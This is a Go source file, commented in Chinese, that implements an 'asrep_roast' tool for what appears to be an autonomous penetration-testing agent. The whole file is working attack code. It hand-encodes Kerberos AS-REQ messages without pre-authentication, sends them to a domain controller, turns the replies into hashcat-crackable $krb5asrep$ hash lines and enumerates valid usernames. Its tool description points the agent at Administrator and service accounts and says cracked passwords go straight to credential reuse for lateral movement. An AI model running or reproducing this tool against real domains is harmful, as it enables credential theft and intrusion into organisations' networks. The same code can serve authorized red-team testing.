package agent

// Kerberos AS-REP Roasting 工具（YCode 二开 · Windows 域纵深）：asrep_roast 对域控 88 端口
// 逐个用户发【无预认证的 AS-REQ】：
//   - 账号设置了「不需要 Kerberos 预认证」→ KDC 直接回 AS-REP，其 enc-part 用该用户
//     口令的密钥加密 → 提取为 hashcat/john 可离线破解的哈希行（AS-REP Roasting）；
//   - KDC-ERR_PREAUTH_REQUIRED(25) → 账号存在但需预认证（不可烤，同时=用户名有效的信号）；
//   - KDC-ERR_C_PRINCIPAL_UNKNOWN(6) → 用户不存在。
// 副产品：preauth-required 与 unknown 的差异构成【用户名枚举 oracle】。纯只读探测，
// 每用户一次请求、串行+间隔。RFC 4120 ASN.1 为 EXPLICIT TAGS，DER 手写编解码，零依赖。

import (
	"context"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/big"
	"net"
	"strings"
	"time"

	actool "github.com/Autumn-27/norma/tool"
)

// ---------- 极简 DER 编码（RFC 4120 显式标签风格） ----------

func derLen(n int) []byte {
	if n < 0x80 {
		return []byte{byte(n)}
	}
	var be []byte
	for v := n; v > 0; v >>= 8 {
		be = append([]byte{byte(v)}, be...)
	}
	return append([]byte{byte(0x80 | len(be))}, be...)
}

func derTLV(tag byte, content []byte) []byte {
	out := []byte{tag}
	out = append(out, derLen(len(content))...)
	return append(out, content...)
}

func derInt(v int64) []byte {
	b := big.NewInt(v).Bytes() // 大端、无前导零
	if len(b) == 0 || b[0]&0x80 != 0 {
		b = append([]byte{0}, b...) // 保持正数语义
	}
	return derTLV(0x02, b)
}

func derOctet(b []byte) []byte { return derTLV(0x04, b) }

func derSeq(parts ...[]byte) []byte {
	var all []byte
	for _, p := range parts {
		all = append(all, p...)
	}
	return derTLV(0x30, all)
}

// derCtx 构造显式上下文标签 [n]（constructed，包裹已编码内容）。
func derCtx(n int, inner []byte) []byte { return derTLV(byte(0xA0|n), inner) }

// derGeneralString 按 GeneralString(0x1B) 编码——RFC 4120 实现（含 AD）普遍按原始
// 字节接受 UTF-8 Kerberos 字符串。
func derGeneralString(s string) []byte { return derTLV(0x1B, []byte(s)) }

func derGeneralizedTime(t time.Time) []byte {
	return derTLV(0x18, []byte(t.UTC().Format("20060102150405Z")))
}

// ---------- 极简 DER 解码：浅层游走 ----------

type derNode struct {
	tag     byte
	content []byte
}

// derChildren 解析一个 constructed 节点内容的直接子节点（浅层）。
func derChildren(content []byte) []derNode {
	var out []derNode
	for len(content) >= 2 {
		tag := content[0]
		l := int(content[1])
		n := 2 // tag(1) + 短格式 len(1)，payload 从 2 起
		if l&0x80 != 0 {
			nb := l & 0x7F
			if nb == 0 || nb > 4 || 2+nb > len(content) {
				return out // 不支持的不定长/超长，尽力返回已解析
			}
			l = 0
			for i := 0; i < int(nb); i++ {
				l = l<<8 | int(content[2+i])
			}
			n = 2 + int(nb)
		}
		if n+l > len(content) {
			return out
		}
		out = append(out, derNode{tag: tag, content: content[n : n+l]})
		content = content[n+l:]
	}
	return out
}

// derFind 在兄弟节点里找第一个指定标签。
func derFind(nodes []derNode, tag byte) (derNode, bool) {
	for _, nd := range nodes {
		if nd.tag == tag {
			return nd, true
		}
	}
	return derNode{}, false
}

// derInner 取上下文标签的字段层：EXPLICIT [n] SEQ {...} 时下潜进 SEQ 的 children，
// 否则直接返回 children。
func derInner(nd derNode) []derNode {
	kids := derChildren(nd.content)
	if len(kids) == 1 && kids[0].tag == 0x30 {
		return derChildren(kids[0].content)
	}
	return kids
}

func derAsInt(nd derNode) (int64, error) {
	if len(nd.content) == 0 || len(nd.content) > 8 {
		return 0, fmt.Errorf("bad INTEGER len %d", len(nd.content))
	}
	var v int64
	for _, b := range nd.content {
		v = v<<8 | int64(b)
	}
	return v, nil
}

// ---------- AS-REQ 构造 ----------

// buildASReq 构造一个无 padata 的 AS-REQ（roast 探测形态）。
func buildASReq(user, realm string, nonce int64) []byte {
	principal := func(name string) []byte {
		return derSeq(derCtx(0, derInt(1)), derCtx(1, derSeq(derGeneralString(name))))
	}
	kdcOptions := derTLV(0x03, append([]byte{0}, make([]byte, 8)...)) // BIT STRING 8 字节全零
	reqBody := derSeq(
		derCtx(0, kdcOptions),
		derCtx(1, principal(user)),
		derCtx(2, derGeneralString(realm)),
		derCtx(3, principal("krbtgt")),
		derCtx(5, derGeneralizedTime(time.Now().Add(24*time.Hour))),
		derCtx(7, derInt(nonce)),
		derCtx(8, derSeq(derInt(23), derInt(18), derInt(17))), // 优先 RC4(23)，roast 最优
	)
	return derTLV(0x6E, derSeq( // [APPLICATION 14]
		derCtx(0, derInt(5)),  // pvno
		derCtx(1, derInt(10)), // msg-type AS-REQ
		derCtx(4, reqBody),
	))
}

// ---------- 响应判定 ----------

const (
	krbErrPreauthRequired  = 25 // KDC_ERR_PREAUTH_REQUIRED：账号存在、需预认证（不可烤）
	krbErrPrincipalUnknown = 6  // KDC_ERR_C_PRINCIPAL_UNKNOWN：用户不存在
	krbErrPreauthFailed    = 24 // KDC_ERR_PREAUTH_FAILED
	krbErrEtypeNosupp      = 14 // KDC_ERR_ETYPE_NOSUPP
)

type asrepOutcome struct {
	Kind    string `json:"kind"` // roastable / preauth_required / no_such_user / error / kdc_error
	Etype   int64  `json:"etype,omitempty"`
	Hashcat string `json:"hashcat,omitempty"`
	ErrCode int64  `json:"krb_error_code,omitempty"`
	Error   string `json:"error,omitempty"`
	Note    string `json:"note,omitempty"`
}

// parseKDCReply 解析 KDC 应答 DER，给出 roast 判定。
func parseKDCReply(der []byte) asrepOutcome {
	if len(der) < 2 {
		return asrepOutcome{Kind: "error", Error: "应答过短"}
	}
	// EXPLICIT APPLICATION 标签下再包一层 SEQUENCE：[APP n] SEQ {...}——先剥到字段层。
	top := derChildren(der[derHeaderLen(der):])
	if len(top) == 1 && top[0].tag == 0x30 {
		top = derChildren(top[0].content)
	}
	switch der[0] {
	case 0x6B: // [APPLICATION 11] AS-REP —— 直接回包 = 无预认证 = 可烤
		out := asrepOutcome{Kind: "roastable"}
		crealm, user := "", ""
		if nd, ok := derFind(top, 0xA3); ok { // cname [3]
			for _, c := range derInner(nd) {
				if c.tag == 0xA1 { // name-string [1] SEQ OF GeneralString
					if ss := derChildren(c.content); len(ss) > 0 {
						// 元素是 GeneralString TLV(1b L ...)，剥壳取纯字符串
						if gs := derChildren(ss[0].content); len(gs) == 1 {
							user = string(gs[0].content)
						} else {
							user = string(ss[0].content)
						}
					}
				}
			}
		}
		if nd, ok := derFind(top, 0xA2); ok { // crealm [2] GeneralString
			if gs := derChildren(nd.content); len(gs) == 1 {
				crealm = string(gs[0].content)
			} else {
				crealm = string(nd.content)
			}
		}
		if nd, ok := derFind(top, 0xA5); ok { // enc-part [5] EncryptedData
			ed := derInner(nd)
			if et, ok2 := derFind(ed, 0xA0); ok2 { // etype [0] EXPLICIT INTEGER
				if inner := derChildren(et.content); len(inner) > 0 {
					v, _ := derAsInt(inner[0])
					out.Etype = v
				}
			}
			if ct, ok2 := derFind(ed, 0xA2); ok2 { // cipher [2] EXPLICIT OCTET STRING
				c := ct.content
				if inner := derChildren(ct.content); len(inner) == 1 {
					c = inner[0].content
				}
				head, tail := c, []byte{}
				if len(c) > 16 {
					head, tail = c[:16], c[16:]
				}
				out.Hashcat = fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
					out.Etype, user, strings.ToUpper(crealm),
					hex.EncodeToString(head), hex.EncodeToString(tail))
			}
		}
		out.Note = "离线破解：RC4(etype 23)→hashcat -m 18200 / john；AES(etype 17/18)→hashcat 19900 段(以 --help 为准)。破解出的口令立即回 credential-reuse 复用矩阵"
		return out
	case 0x7E: // [APPLICATION 30] KRB-ERROR
		code := int64(-1)
		if nd, ok := derFind(top, 0xA6); ok { // error-code [6] EXPLICIT INTEGER
			if inner := derChildren(nd.content); len(inner) > 0 {
				code, _ = derAsInt(inner[0])
			}
		} else if nd, ok := derFind(top, 0x86); ok { // 兼容 IMPLICIT 编码
			code, _ = derAsInt(nd)
		}
		switch code {
		case krbErrPreauthRequired:
			return asrepOutcome{Kind: "preauth_required", ErrCode: code,
				Note: "账号存在但需预认证（不可烤）；与 no_such_user 的差异=用户名枚举 oracle"}
		case krbErrPrincipalUnknown:
			return asrepOutcome{Kind: "no_such_user", ErrCode: code}
		case krbErrEtypeNosupp:
			return asrepOutcome{Kind: "kdc_error", ErrCode: code, Note: "KDC 不接受请求的 etype 组合"}
		default:
			return asrepOutcome{Kind: "kdc_error", ErrCode: code}
		}
	default:
		return asrepOutcome{Kind: "error", Error: fmt.Sprintf("未知应答 tag 0x%02X", der[0])}
	}
}

// derHeaderLen 返回 TLV 头长度（tag+len 字段）。
func derHeaderLen(der []byte) int {
	if len(der) < 2 {
		return 0
	}
	l := int(der[1])
	if l&0x80 == 0 {
		return 2
	}
	return 2 + int(l&0x7F)
}

// krbTCPExchange TCP 帧收发：4 字节大端长度前缀。
func krbTCPExchange(conn net.Conn, req []byte, timeout time.Duration) ([]byte, error) {
	_ = conn.SetDeadline(time.Now().Add(timeout))
	if _, err := conn.Write(append(binary.BigEndian.AppendUint32(nil, uint32(len(req))), req...)); err != nil {
		return nil, err
	}
	var lenBuf [4]byte
	if _, err := ioReadFull(conn, lenBuf[:]); err != nil {
		return nil, err
	}
	n := binary.BigEndian.Uint32(lenBuf[:])
	if n == 0 || n > 1<<20 {
		return nil, fmt.Errorf("应答长度异常 %d", n)
	}
	buf := make([]byte, n)
	if _, err := ioReadFull(conn, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

func ioReadFull(conn net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := conn.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

// ---------- 工具 ----------

func (t *ToolSet) asrepRoast() actool.CoreTool {
	return readTool("asrep_roast",
		"(域纵深)Kerberos AS-REP Roasting 探测：对域控(KDC,88/TCP)逐用户发无预认证 AS-REQ——账号未启用预认证时 KDC 直接回 AS-REP，提取 enc-part 为 hashcat/john 可离线破解的哈希行($krb5asrep$...)；PREAUTH_REQUIRED(25)=账号存在但不可烤；PRINCIPAL_UNKNOWN(6)=用户不存在。副产品：25 与 6 的差异=域用户名枚举。用途：①拿到域控地址后批量探测可烤账号 ②用户名有效性枚举。破解出的口令立即回 credential-reuse 矩阵做横向复用。只读探测、串行+间隔、每用户一次。",
		obj(map[string]any{
			"host": map[string]any{
				"type": "string", "description": "域控/KDC 地址(IP 或域名)。",
			},
			"realm": map[string]any{
				"type": "string", "description": "Kerberos 领域(域 FQDN 大写，如 CORP.LOCAL)；空则取 host 原样。",
			},
			"users": map[string]any{
				"type": "array", "items": map[string]any{"type": "string"},
				"description": "待探测用户名列表(≤40)，建议含 Administrator/admin/sqlsvc/服务账号等高价值目标。",
			},
			"port": map[string]any{
				"type": "integer", "default": 88, "description": "KDC 端口(默认 88)。",
			},
			"timeout_ms": map[string]any{
				"type": "integer", "default": 5000, "description": "单请求超时毫秒(1000..15000)。",
			},
		}, "host", "realm", "users"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var p struct {
				Host      string   `json:"host"`
				Realm     string   `json:"realm"`
				Users     []string `json:"users"`
				Port      int      `json:"port"`
				TimeoutMs int      `json:"timeout_ms"`
			}
			if err := json.Unmarshal(in, &p); err != nil {
				return actool.Errorf("参数解析失败: " + err.Error()), nil
			}
			host := strings.TrimSpace(p.Host)
			if host == "" {
				return actool.Errorf("host 不能为空"), nil
			}
			realm := strings.ToUpper(strings.TrimSpace(p.Realm))
			if realm == "" {
				realm = strings.ToUpper(host)
			}
			if p.Port <= 0 {
				p.Port = 88
			}
			if len(p.Users) == 0 {
				return actool.Errorf("users 不能为空"), nil
			}
			if len(p.Users) > 40 {
				return actool.Errorf(fmt.Sprintf("用户过多(%d>40)，请分批", len(p.Users))), nil
			}
			timeout := time.Duration(p.TimeoutMs) * time.Millisecond
			if timeout <= 0 {
				timeout = 5 * time.Second
			}
			if timeout > 15*time.Second {
				timeout = 15 * time.Second
			}

			type userResult struct {
				Username string       `json:"username"`
				Outcome  asrepOutcome `json:"outcome"`
			}
			results := make([]userResult, 0, len(p.Users))
			roastable, validUsers := []string{}, []string{}
			unreachable := 0

			for i, u := range p.Users {
				if u = strings.TrimSpace(u); u == "" {
					continue
				}
				if ctx.Err() != nil {
					return actool.Errorf("已取消"), nil
				}
				if i > 0 {
					select {
					case <-time.After(200 * time.Millisecond):
					case <-ctx.Done():
						return actool.Errorf("已取消"), nil
					}
				}
				nonceB := make([]byte, 4)
				_, _ = rand.Read(nonceB)
				nonce := int64(binary.BigEndian.Uint32(nonceB))
				res := userResult{Username: u}
				conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, fmt.Sprintf("%d", p.Port)), timeout)
				if err != nil {
					res.Outcome = asrepOutcome{Kind: "error", Error: "连接失败: " + err.Error()}
					unreachable++
					results = append(results, res)
					continue
				}
				reply, err := krbTCPExchange(conn, buildASReq(u, realm, nonce), timeout)
				_ = conn.Close()
				if err != nil {
					res.Outcome = asrepOutcome{Kind: "error", Error: err.Error()}
					unreachable++
					results = append(results, res)
					continue
				}
				res.Outcome = parseKDCReply(reply)
				switch res.Outcome.Kind {
				case "roastable":
					roastable = append(roastable, u)
				case "preauth_required":
					validUsers = append(validUsers, u)
				}
				results = append(results, res)
			}

			if unreachable == len(results) && unreachable > 0 {
				return actool.Errorf("KDC 不可达：全部请求失败，样例：" + results[0].Outcome.Error), nil
			}
			out := map[string]any{
				"host":        host,
				"realm":       realm,
				"results":     results,
				"roastable":   roastable,
				"valid_users": validUsers,
			}
			if len(roastable) > 0 {
				out["verdict"] = fmt.Sprintf("发现 %d 个可烤账号(未启用预认证)——高危：哈希行可离线破解，破解口令即域账号口令", len(roastable))
			} else if len(validUsers) > 0 {
				out["verdict"] = fmt.Sprintf("无可烤账号；%d 个用户名有效(preauth_required)——用户名枚举结论成立", len(validUsers))
			} else {
				out["verdict"] = "全部用户不存在或无有效应答"
			}
			return jsonResult(out)
		})
}
